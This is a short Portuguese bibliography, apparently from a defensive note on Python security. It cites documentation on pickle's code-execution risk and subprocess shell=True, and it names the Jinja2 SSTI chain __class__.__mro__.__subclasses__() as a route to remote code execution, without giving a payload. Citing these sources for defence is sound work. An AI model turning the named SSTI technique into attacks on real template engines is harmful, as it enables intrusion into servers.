- **Python Software Foundation** — [*documentação oficial do módulo `pickle`*](https://docs.python.org/3/library/pickle.html) — inclui o aviso de segurança explícito sobre execução de código arbitrário durante unpickling, citado nesta nota. Consultado em 2026-07.
- **Python Software Foundation** — [*documentação oficial do módulo `subprocess`*](https://docs.python.org/3/library/subprocess.html) — seção de segurança sobre `shell=True` e por que passar argumentos como lista com `shell=False` é a forma recomendada. Consultado em 2026-07.
- **Real Python** — [*Python Subprocess: A Deep Dive*](https://realpython.com/python-subprocess/) — uso prático de `subprocess.run()`, diferenças entre `shell=True`/`shell=False`. Consultado em 2026-07.
- **Palo Alto Networks Unit 42** — pesquisa pública sobre exploração de SSTI em Jinja2 via `__class__.__mro__.__subclasses__()` até RCE, referência para o mecanismo descrito na seção de SSTI (princípio geral, sem payload de exploit reproduzido nesta nota).
